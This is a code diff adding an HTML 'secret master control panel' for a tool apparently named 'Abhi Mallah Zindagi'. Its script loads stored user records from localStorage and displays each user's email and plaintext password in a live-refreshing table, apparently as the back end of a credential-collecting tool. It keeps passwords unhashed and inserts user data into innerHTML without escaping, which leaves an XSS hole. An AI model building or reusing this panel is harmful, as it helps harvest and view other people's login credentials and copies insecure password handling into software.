@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Control Center - Abhi Mallah Zindagi</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+        body { background: #07090e; color: #ff5555; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .admin-container { width: 100vw; height: 100vh; max-width: 440px; max-height: 920px; background: #0c101d; display: flex; flex-direction: column; overflow: hidden; box-shadow: 0 0 35px rgba(255, 85, 85, 0.2); border: 2px solid #ff555555; border-radius: 20px; position: relative; }
+        .header { background: linear-gradient(135deg, #7f1d1d, #450a0a, #1e1b4b); padding: 14px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 2px solid #ff5555; }
+        .logo-hexagon { width: 40px; height: 40px; background: #ff5555; color: #ffffff; font-weight: 900; font-size: 11px; display: flex; justify-content: center; align-items: center; clip-path: polygon(25% 6%, 75% 6%, 100% 50%, 75% 94%, 25% 94%, 0% 50%); }
+        .header-text h2 { font-size: 14px; color: #ffffff; font-weight: bold; }
+        .header-text p { font-size: 9.5px; color: #fca5a5; }
+        .content { flex: 1; padding: 12px; overflow-y: auto; }
+        .section-title { font-size: 10px; color: #fca5a5; margin: 8px 0 4px 0; font-weight: bold; text-transform: uppercase; border-bottom: 1px dashed #7f1d1d; padding-bottom: 2px; }
+        .stat-card { background: #151c2f; border: 1px solid #334155; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .stat-card span { font-size: 11px; color: #94a3b8; }
+        .stat-card b { font-size: 14px; color: #00ffcc; }
+        .broadcast-box textarea { width: 100%; background: #020408; border: 1px solid #475569; color: #00ffcc; padding: 8px; border-radius: 6px; font-size: 11px; resize: none; height: 60px; outline: none; }
+        .btn-send { width: 100%; background: #ef4444; color: white; border: none; padding: 8px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; margin-top: 5px; }
+        .btn-send:hover { background: #dc2626; }
+        .user-table { width: 100%; border-collapse: collapse; margin-top: 5px; }
+        .user-table th, .user-table td { border: 1px solid #1e293b; padding: 6px; font-size: 9px; text-align: left; word-break: break-all; }
+        .user-table th { background: #1e293b; color: #cbd5e1; }
+        .user-table td { color: #38bdf8; }
+        .btn-delete { background: #ef4444; color: #fff; border: none; padding: 3px 6px; font-size: 9px; border-radius: 3px; cursor: pointer; }
+        .footer { text-align: center; padding: 7px; font-size: 9px; background: #020408; color: #64748b; border-top: 1px solid #1e293b; }
+    </style>
+</head>
+<body>
+    <div class="admin-container">
+        <div class="header">
+            <div class="logo-hexagon">ADMIN</div>
+            <div class="header-text">
+                <h2>Abhi Mallah Zindagi</h2>
+                <p>SECRET MASTER CONTROL PANEL</p>
+            </div>
+        </div>
+        <div class="content">
+            <div class="section-title">>> System Analytics</div>
+            <div class="stat-card">
+                <span>Total User Logins:</span>
+                <b id="totalUsersCount">0</b>
+            </div>
+
+            <div class="section-title">>> Broadcast Notice to All Users</div>
+            <div class="broadcast-box">
+                <textarea id="broadcastMsg" placeholder="Type global message for users..."></textarea>
+                <button class="btn-send" onclick="sendBroadcast()">Send Broadcast Notice</button>
+            </div>
+
+            <div class="section-title">>> Live User Database Logs</div>
+            <div style="max-height: 280px; overflow-y: auto;">
+                <table class="user-table">
+                    <thead>
+                        <tr>
+                            <th>User Email</th>
+                            <th>Password</th>
+                            <th>Date & Time</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="userTableBody">
+                        <!-- Dynamic data -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div class="footer">Admin Panel Secured by ZEE-786</div>
+    </div>
+
+    <script>
+        function loadAdminData() {
+            let users = JSON.parse(localStorage.getItem('tool_users') || '[]');
+            document.getElementById('totalUsersCount').innerText = users.length;
+
+            let tbody = document.getElementById('userTableBody');
+            tbody.innerHTML = '';
+
+            if(users.length === 0) {
+                tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:#64748b;">No user activity recorded yet.</td></tr>`;
+                return;
+            }
+
+            users.forEach((user, index) => {
+                let tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${user.email || 'N/A'}</td>
+                    <td style="color: #00ffcc; font-weight: bold; background: #020408;">${user.password || 'N/A'}</td>
+                    <td style="color: #facc15;">${user.time || 'N/A'}</td>
+                    <td><button class="btn-delete" onclick="deleteUser(${index})">Remove</button></td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        function sendBroadcast() {
+            let msg = document.getElementById('broadcastMsg').value;
+            if(!msg) {
+                alert("Please type a message first!");
+                return;
+            }
+            localStorage.setItem('tool_broadcast', msg);
+            alert("Broadcast notice sent to user tool!");
+            document.getElementById('broadcastMsg', '').value = '';
+        }
+
+        function deleteUser(index) {
+            let users = JSON.parse(localStorage.getItem('tool_users') || '[]');
+            users.splice(index, 1);
+            localStorage.setItem('tool_users', JSON.stringify(users));
+            loadAdminData();
+        }
+
+        // Auto refresh table every 2 seconds
+        setInterval(loadAdminData, 2000);
+        window.onload = loadAdminData;
+    </script>
+</body>
+</html>
